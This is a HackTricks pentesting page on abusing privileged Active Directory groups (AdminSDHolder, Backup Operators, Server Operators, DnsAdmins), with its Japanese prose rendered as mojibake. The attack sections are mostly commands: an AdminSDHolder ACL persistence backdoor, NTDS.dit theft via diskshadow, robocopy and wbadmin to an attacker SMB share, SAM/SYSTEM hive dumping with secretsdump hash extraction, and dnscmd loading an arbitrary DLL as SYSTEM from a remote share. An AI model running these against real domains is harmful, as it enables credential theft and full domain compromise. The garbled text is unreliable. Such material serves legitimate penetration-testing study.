# ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ç®¡ç†ç‰¹æ¨©ã‚’æŒã¤æ—¢çŸ¥ã®ã‚°ãƒ«ãƒ¼ãƒ—

* **Administrators**
* **Domain Admins**
* **Enterprise Admins**

ä»–ã«ã‚‚ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ä¸­ã«è¤‡æ•°ã®æ”»æ’ƒãƒ™ã‚¯ãƒˆãƒ«ã‚’é€£é–ã•ã›ã‚‹éš›ã«å½¹ç«‹ã¤ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã¨ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã®ç‰¹æ¨©ãŒã‚ã‚Šã¾ã™ã€‚

## ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ <a href="#account-operators" id="account-operators"></a>

* ãƒ‰ãƒ¡ã‚¤ãƒ³ä¸Šã§éç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¨ã‚°ãƒ«ãƒ¼ãƒ—ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™
* DCã«ãƒ­ãƒ¼ã‚«ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

![](<../../.gitbook/assets/1 (2) (1) (1).png>)

ã—ã‹ã—ã€æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã¯ã¾ã å¯èƒ½ã§ã™ï¼š

![](../../.gitbook/assets/a2.png)

ã¾ãŸã€DC01ã«ãƒ­ãƒ¼ã‚«ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

![](../../.gitbook/assets/a3.png)

## AdminSDHolderã‚°ãƒ«ãƒ¼ãƒ—

**AdminSDHolder**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒªã‚¹ãƒˆï¼ˆACLï¼‰ã¯ã€Active Directoryå†…ã®ã™ã¹ã¦ã®ã€Œä¿è­·ã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—ã€ãŠã‚ˆã³ãã‚Œã‚‰ã®ãƒ¡ãƒ³ãƒãƒ¼ã«**æ¨©é™ã‚’ã‚³ãƒ”ãƒ¼**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ä¿è­·ã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—ã«ã¯ã€Domain Adminsã€Administratorsã€Enterprise Adminsã€ãŠã‚ˆã³Schema Adminsãªã©ã®ç‰¹æ¨©ã‚°ãƒ«ãƒ¼ãƒ—ãŒå«ã¾ã‚Œã¾ã™ã€‚\
ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ACLã¯ã€Œä¿è­·ã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—ã€å†…ã«ã‚³ãƒ”ãƒ¼ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã‚Œã‚‰ã®é‡è¦ãªã‚°ãƒ«ãƒ¼ãƒ—ã¸ã®æ„å›³çš„ã¾ãŸã¯å¶ç™ºçš„ãªå¤‰æ›´ã‚’é˜²ããŸã‚ã«è¡Œã‚ã‚Œã¾ã™ã€‚ãŸã ã—ã€æ”»æ’ƒè€…ãŒä¾‹ãˆã°é€šå¸¸ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å®Œå…¨ãªæ¨©é™ã‚’ä¸ãˆã‚‹ãªã©ã€AdminSDHolderã‚°ãƒ«ãƒ¼ãƒ—ã®ACLã‚’å¤‰æ›´ã—ãŸå ´åˆã€ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä¿è­·ã•ã‚ŒãŸã‚°ãƒ«ãƒ¼ãƒ—å†…ã®ã™ã¹ã¦ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«å¯¾ã—ã¦å®Œå…¨ãªæ¨©é™ã‚’æŒã¤ã“ã¨ã«ãªã‚Šã¾ã™ï¼ˆ1æ™‚é–“ä»¥å†…ã«ï¼‰ã€‚\
ãã—ã¦ã€ã‚‚ã—èª°ã‹ãŒã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’Domain Adminsã‹ã‚‰å‰Šé™¤ã—ã‚ˆã†ã¨ã—ãŸå ´åˆã€1æ™‚é–“ä»¥å†…ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã‚°ãƒ«ãƒ¼ãƒ—ã«æˆ»ã•ã‚Œã¾ã™ã€‚

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
```
**AdminSDHolder** ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è¿½åŠ ã—ã¾ã™:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```
**Domain Admins** ã‚°ãƒ«ãƒ¼ãƒ—ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™:
```powershell
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
1æ™‚é–“å¾…ã¤ã®ãŒå«Œãªå ´åˆã¯ã€PSã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦å³åº§ã«å¾©å…ƒã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š[https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)

[**è©³ç´°ã¯ired.teamã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)

## **AD Recycle Bin**

ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«ã¯ã€å‰Šé™¤ã•ã‚ŒãŸADã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’èª­ã¿å–ã‚‹æ¨©é™ãŒã‚ã‚Šã¾ã™ã€‚ãã“ã«ã¯èˆˆå‘³æ·±ã„æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```bash
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ç¾åœ¨ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã§ã¯ã€DCä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ï¼š

![](../../.gitbook/assets/a4.png)

ã—ã‹ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ`Server Operators`ã«å±ã—ã¦ã„ã‚‹å ´åˆï¼š

![](../../.gitbook/assets/a5.png)

çŠ¶æ³ãŒå¤‰ã‚ã‚Šã¾ã™ï¼š

![](../../.gitbook/assets/a6.png)

### ç‰¹æ¨©æ˜‡æ ¼ <a href="#backup-operators" id="backup-operators"></a>

[`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice)ã¾ãŸã¯Sysinternalsã®`sc`ã‚’ä½¿ç”¨ã—ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ã®æ¨©é™ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚
```
C:\> .\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

[...]

[ALLOW] BUILTIN\Server Operators
All
```
ã“ã‚Œã«ã‚ˆã‚Šã€Server Operatorsã‚°ãƒ«ãƒ¼ãƒ—ãŒ[SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã•ã‚Œã¾ã—ãŸã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã«å¯¾ã—ã¦å®Œå…¨ãªåˆ¶å¾¡ãŒå¯èƒ½ã§ã™ã€‚\
ã“ã®ã‚µãƒ¼ãƒ“ã‚¹ã‚’æ‚ªç”¨ã—ã¦ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## Backup Operators <a href="#backup-operators" id="backup-operators"></a>

`Server Operators`ã«æ‰€å±ã—ã¦ã„ã‚‹å ´åˆã¨åŒæ§˜ã«ã€`Backup Operators`ã«æ‰€å±ã—ã¦ã„ã‚‹å ´åˆã¯ã€`DC01`ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚

ã“ã‚Œã¯ã€ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ãŒãã®**ãƒ¡ãƒ³ãƒãƒ¼**ã«[**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4)ã¨[**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)ã®ç‰¹æ¨©ã‚’ä»˜ä¸ã—ã¦ã„ã‚‹ãŸã‚ã§ã™ã€‚**SeBackupPrivilege**ã«ã‚ˆã‚Šã€ä»»æ„ã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’ãƒˆãƒ©ãƒãƒ¼ã‚¹ã—ã€ãƒ•ã‚©ãƒ«ãƒ€ã®å†…å®¹ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä»–ã«æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã¦ã„ãªã„å ´åˆã§ã‚‚ã€ãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ãŸã‚ã«ã¯ã€ãƒ•ãƒ©ã‚°[**FILE_FLAG_BACKUP_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ç‰¹åˆ¥ãªãƒ„ãƒ¼ãƒ«ãŒå¿…è¦ã§ã™ã€‚

ã“ã®ç›®çš„ã®ãŸã‚ã«ã€[**ã“ã‚Œã‚‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**](https://github.com/giuliano108/SeBackupPrivilege)**ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚**

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### **ãƒ­ãƒ¼ã‚«ãƒ«æ”»æ’ƒ**
```bash
# Import libraries
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege # ...or whoami /priv | findstr Backup SeBackupPrivilege is disabled

# Enable SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# List Admin folder for example and steal a file
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\\report.pdf c:\temp\x.pdf -Overwrite
```
### ADæ”»æ’ƒ

ä¾‹ãˆã°ã€ç›´æ¥ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

![](../../.gitbook/assets/a7.png)

ã“ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æ‚ªç”¨ã—ã¦ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**NTLMãƒãƒƒã‚·ãƒ¥**ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**`NTDS.dit`**ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

#### diskshadow.exeã‚’ä½¿ç”¨ã—ã¦NTDS.ditã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹

[**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**`C`ãƒ‰ãƒ©ã‚¤ãƒ–**ã¨ä¾‹ãˆã°`F`ãƒ‰ãƒ©ã‚¤ãƒ–ã«**ã‚·ãƒ£ãƒ‰ã‚¦ã‚³ãƒ”ãƒ¼**ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€ã‚·ã‚¹ãƒ†ãƒ ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€ã“ã®ã‚·ãƒ£ãƒ‰ã‚¦ã‚³ãƒ”ãƒ¼ã‹ã‚‰`NTDS.dit`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã¾ã™ï¼š
```
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 10:34:16 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% F:
DISKSHADOW> end backup
DISKSHADOW> exit
```
ãƒ­ãƒ¼ã‚«ãƒ«æ”»æ’ƒã¨åŒæ§˜ã«ã€ç‰¹æ¨©ãƒ•ã‚¡ã‚¤ãƒ« **`NTDS.dit`** ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
åˆ¥ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹æ–¹æ³•ã¯ã€[**robocopy**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™**ï¼š
```
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
æ¬¡ã«ã€ç°¡å˜ã«**SYSTEM**ã¨**SAM**ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ï¼š
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
ã¤ã„ã«ã€**`NTDS.dit`** ã‹ã‚‰**ã™ã¹ã¦ã®ãƒãƒƒã‚·ãƒ¥ã‚’å–å¾—**ã§ãã¾ã™:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### NTDS.ditã®ãƒ€ãƒ³ãƒ—ã«wbadmin.exeã‚’ä½¿ç”¨ã™ã‚‹

wbadmin.exeã®ä½¿ç”¨æ–¹æ³•ã¯ã€diskshadow.exeã¨éå¸¸ã«ä¼¼ã¦ã„ã¾ã™ã€‚wbadmin.exeãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã¯ã€Windows Vista/Server 2008ä»¥é™ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«çµ„ã¿è¾¼ã¾ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã§ã™ã€‚

ä½¿ç”¨ã™ã‚‹å‰ã«ã€æ”»æ’ƒè€…ã®ãƒã‚·ãƒ³ã§[**SMBã‚µãƒ¼ãƒãƒ¼ã®ãŸã‚ã®NTFSãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801)ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

SMBã‚µãƒ¼ãƒãƒ¼ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ãŒå®Œäº†ã—ãŸã‚‰ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã§SMBã®è³‡æ ¼æƒ…å ±ã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
# cache the smb credential.
net use X: \\<AttackIP>\sharename /user:smbuser password

# check if working.
dir X:\
```
ã‚¨ãƒ©ãƒ¼ãŒãªã‘ã‚Œã°ã€wbadmin.exeã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚’æ‚ªç”¨ã—ã¾ã™ã€‚
```
# Start backup the system.
# In here, no need to use `X:\`, just using `\\<AttackIP>\sharename` should be ok.
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds

# Look at the backup version to get time.
wbadmin get versions

# Restore the version to dump ntds.dit.
echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
ã‚‚ã—æˆåŠŸã™ã‚Œã°ã€`C:\ntds.dit`ã«ãƒ€ãƒ³ãƒ—ã•ã‚Œã¾ã™ã€‚

[IPPSECã®ãƒ‡ãƒ¢ãƒ“ãƒ‡ã‚ª](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)

## DnsAdmins

**DNSAdmins**ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¾ãŸã¯**DNSã‚µãƒ¼ãƒãƒ¼**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®**æ›¸ãè¾¼ã¿æ¨©é™**ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€**DNSã‚µãƒ¼ãƒãƒ¼**ä¸Šã§**SYSTEMæ¨©é™**ã§**ä»»æ„ã®DLL**ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã¯ã€**ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼**ãŒéå¸¸ã«é »ç¹ã«**DNSã‚µãƒ¼ãƒãƒ¼**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹ãŸã‚ã€éå¸¸ã«èˆˆå‘³æ·±ã„ã§ã™ã€‚

ã“ã®\*\*\*\*[**ãƒã‚¹ãƒˆ**](https://adsecurity.org/?p=4064)ã«ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€æ¬¡ã®æ”»æ’ƒã¯ã€DNSãŒãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´åˆï¼ˆéå¸¸ã«ä¸€èˆ¬çš„ã§ã™ï¼‰ã«å®Ÿè¡Œã§ãã¾ã™ï¼š

* DNSç®¡ç†ã¯RPCçµŒç”±ã§è¡Œã‚ã‚Œã¾ã™
* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723)ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€**DLLã®ãƒ‘ã‚¹ã®æ¤œè¨¼ãŒã‚¼ãƒ­**ã§ã‚«ã‚¹ã‚¿ãƒ **DLL**ã‚’**ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‹ã‚‰`dnscmd`ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†ã“ã¨ãŒã§ãã¾ã™
* **`DnsAdmins`**ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ãŒä»¥ä¸‹ã®**`dnscmd`**ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚­ãƒ¼ãŒè¨­å®šã•ã‚Œã¾ã™
* **DNSã‚µãƒ¼ãƒ“ã‚¹ãŒå†èµ·å‹•**ã•ã‚Œã‚‹ã¨ã€ã“ã®ãƒ‘ã‚¹ã«ã‚ã‚‹**DLL**ãŒ**ãƒ­ãƒ¼ãƒ‰**ã•ã‚Œã¾ã™ï¼ˆã¤ã¾ã‚Šã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã®ãƒã‚·ãƒ³ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å…±æœ‰ï¼‰
* æ”»æ’ƒè€…ã¯ã€**ã‚«ã‚¹ã‚¿ãƒ DLLã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¦ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã‚’å–å¾—**ã—ãŸã‚Šã€Mimikatzã®ã‚ˆã†ãªãƒ„ãƒ¼ãƒ«ã‚’DLLã¨ã—ã¦ãƒ­ãƒ¼ãƒ‰ã—ã¦è³‡æ ¼æƒ…å ±ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### ä»»æ„ã®DLLã®å®Ÿè¡Œ

æ¬¡ã«ã€**DNSAdminsã‚°ãƒ«ãƒ¼ãƒ—**ã«æ‰€å±ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã„ã‚‹å ´åˆã€**DNSã‚µãƒ¼ãƒãƒ¼ã¯SYSTEMç‰¹æ¨©ã§ä»»æ„ã®DLLã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™**ï¼ˆDNSã‚µãƒ¼ãƒ“ã‚¹ã¯`NT AUTHORITY\SYSTEM`ã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ï¼‰ã€‚æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã€DNSã‚µãƒ¼ãƒãƒ¼ã¯**ãƒ­ãƒ¼ã‚«ãƒ«ã¾ãŸã¯ãƒªãƒ¢ãƒ¼ãƒˆ**ï¼ˆSMBã§å…±æœ‰ã•ã‚ŒãŸï¼‰DLLãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿è¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚
```
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
```
